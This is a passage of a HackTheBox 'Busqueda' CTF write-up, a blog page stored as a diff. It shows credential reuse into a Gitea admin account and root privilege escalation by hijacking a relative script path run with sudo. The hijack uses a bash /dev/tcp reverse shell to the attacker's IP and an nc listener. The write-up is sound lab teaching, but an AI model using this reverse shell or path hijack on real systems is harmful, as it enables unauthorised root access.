+</span></span><span class="line"><span class="cl">    &#34;com.docker.compose.version&#34;: &#34;1.29.2&#34;,
+</span></span><span class="line"><span class="cl">    &#34;maintainer&#34;: &#34;maintainers@gitea.io&#34;,
+</span></span><span class="line"><span class="cl">    &#34;org.opencontainers.image.created&#34;: &#34;2022-11-24T13:22:00Z&#34;,
+</span></span><span class="line"><span class="cl">    &#34;org.opencontainers.image.revision&#34;: &#34;9bccc60cf51f3b4070f5506b042a3d9a1442c73d&#34;,
+</span></span><span class="line"><span class="cl">    &#34;org.opencontainers.image.source&#34;: &#34;https://github.com/go-gitea/gitea.git&#34;,
+</span></span><span class="line"><span class="cl">    &#34;org.opencontainers.image.url&#34;: &#34;https://github.com/go-gitea/gitea&#34;
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>There is a lot of information that is tricky to follow, but I&rsquo;m hoping the most notable information is the new password displayed in the <code>GITEA__database__</code> segment: <code>yuiu1hoiu4i5ho1uh</code></p>
+<p>From here we can enter the mysql database as gitea, and see that there is not much information available.</p>
+<p>Since passwords were re-used before, my first thought is to try this password as the root user on the machine?</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">svc@busqueda:~$ su
+</span></span><span class="line"><span class="cl">Password: 
+</span></span><span class="line"><span class="cl">su: Authentication failure
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It does not work. However, when I return to the gitea webpage and use this credential for user administrator, the password is accepted!</p>
+<p><img src="/post/hackthebox-busqueda/Images/administratorlogin.png"
+	width="1178"
+	height="521"
+	srcset="/post/hackthebox-busqueda/Images/administratorlogin_hu082987ee958d9e9c1d67cc6b5168603b_79241_480x0_resize_box_3.png 480w, /post/hackthebox-busqueda/Images/administratorlogin_hu082987ee958d9e9c1d67cc6b5168603b_79241_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Logged in as administrator"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="226"
+		data-flex-basis="542px"
+	
+></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="reading-system-checkuppy-source-code">Reading system-checkup.py source code</h3>
+<p>Now under scripts, we can see what is likely the <code>system-checkup.py</code> we had been executing:</p>
+<p><img src="/post/hackthebox-busqueda/Images/scripts.png"
+	width="1208"
+	height="489"
+	srcset="/post/hackthebox-busqueda/Images/scripts_hu37bd3689428e200c05d2e904f4f73183_76823_480x0_resize_box_3.png 480w, /post/hackthebox-busqueda/Images/scripts_hu37bd3689428e200c05d2e904f4f73183_76823_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Scripts Repository"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="247"
+		data-flex-basis="592px"
+	
+></p>
+<p>With the source code in hand, we can clearly see a very serious oversight in the code:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    elif action == &#39;full-checkup&#39;:
+</span></span><span class="line"><span class="cl">        try:
+</span></span><span class="line"><span class="cl">            arg_list = [&#39;./full-checkup.sh&#39;]
+</span></span><span class="line"><span class="cl">            print(run_command(arg_list))
+</span></span><span class="line"><span class="cl">            print(&#39;[+] Done!&#39;)
+</span></span><span class="line"><span class="cl">        except:
+</span></span><span class="line"><span class="cl">            print(&#39;Something went wrong&#39;)
+</span></span><span class="line"><span class="cl">            exit(1)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>When running full-checkup, the <code>full-checkup.sh</code> is not using the absolute path. Meaning, we can create our own <code>full-checkup.sh</code> in a current working directory, execute full-checkup as root, and our own <code>full-checkup.sh</code> will be ran instead.</p>
+<h3 id="abusing-file-path-manipulation">Abusing File Path Manipulation</h3>
+<p>First I enter a directory where i can write files:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">svc@busqueda:~$ cd /dev/shm
+</span></span><span class="line"><span class="cl">svc@busqueda:/dev/shm$
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Next, I create a simple reverse shell script under the name <code>full-checkup.sh</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">svc@busqueda:/dev/shm$ cat full-checkup.sh 
+</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">bash -i &gt;<span class="p">&amp;</span> /dev/tcp/10.10.14.139/8888 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>On my kali machine, I set up a listener:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ nc -nvlp 8888
+</span></span><span class="line"><span class="cl">listening on [any] 8888 ...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And finally, I run the sudo command:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">svc@busqueda:/dev/shm$ chmod +x full-checkup.sh 
+</span></span><span class="line"><span class="cl">svc@busqueda:/dev/shm$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Back on my listening session:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ nc -nvlp 8888
+</span></span><span class="line"><span class="cl">listening on [any] 8888 ...
+</span></span><span class="line"><span class="cl">connect to [10.10.14.139] from (UNKNOWN) [10.10.11.208] 60866
+</span></span><span class="line"><span class="cl">root@busqueda:/dev/shm# id
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl">uid=0(root) gid=0(root) groups=0(root)
+</span></span><span class="line"><span class="cl">root@busqueda:/dev/shm#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now we are root, and <code>root.txt</code> is up for grabs.</p>
+<h2 id="reflection">Reflection</h2>
+<p>I quite enjoyed this box, being a rather relaxed set of obstacles while not giving anythinig away for free. Finding the web server so strikingly different from Searchor was a little disorienting, but it makes sense that some modifications would be made to translate Searchor, a cli=based project, into something that a web server can handle for visitors.</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/unsafe-eval/">Unsafe eval</a>
+        
+            <a href="/tags/github/">Github</a>
+        
+            <a href="/tags/gitea/">Gitea</a>
+        
+            <a href="/tags/docker/">Docker</a>
+        
+            <a href="/tags/file-path-manipulation/">File Path Manipulation</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-agile/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-agile/Agile.e64eb2d34a7a6346f24c5fd437dde6f0_hu5e06ffde2f95e1276a1510a6a2985d71_363689_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Agile"
+                        
+                        data-hash="md5-5k6y00p6Y0byTF/UN93m8A==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Agile</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-socket/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-socket/Socket.b5f448cb0b8111b44376a9763dfc88f8_hu849eb59558b706146747b24028bb82f3_354031_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Socket"
+                        
+                        data-hash="md5-tfRIywuBEbRDdql2PfyI&#43;A==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Socket</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-inject/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-inject/Inject.9f9716c1200516310e6e4cd98e20c139_hu12ac3957f7a126ac06ec9338f7d84355_333068_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Inject"
+                        
+                        data-hash="md5-n5cWwSAFFjEObkzZjiDBOQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Inject</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2023 Spencer&#39;s Blog
+    </section>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#enumeration">Enumeration</a>
+      <ol>
+        <li><a href="#exploring-the-webpage">Exploring the webpage</a></li>
+        <li><a href="#enumerating-github-pull-requests-and-patch-histories">Enumerating github pull requests and patch histories</a></li>
+      </ol>
+    </li>
+    <li><a href="#foothold">Foothold</a>
+      <ol>
+        <li><a href="#obtaining-shell-access-as-user-svc">Obtaining shell access as user svc</a></li>
+        <li><a href="#enumerating-the-webservers-git-details">Enumerating the webserver&rsquo;s git details</a></li>
+        <li><a href="#finding-credentials-and-testing-for-password-re-use">Finding credentials and testing for password re-use</a></li>
+        <li><a href="#enumerating-svcs-sudo-actions">Enumerating svc&rsquo;s sudo actions</a></li>
+      </ol>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ol>
+        <li><a href="#reading-system-checkuppy-source-code">Reading system-checkup.py source code</a></li>
+        <li><a href="#abusing-file-path-manipulation">Abusing File Path Manipulation</a></li>
+      </ol>
+    </li>
+    <li><a href="#reflection">Reflection</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+
+
+    </body>
+</html>
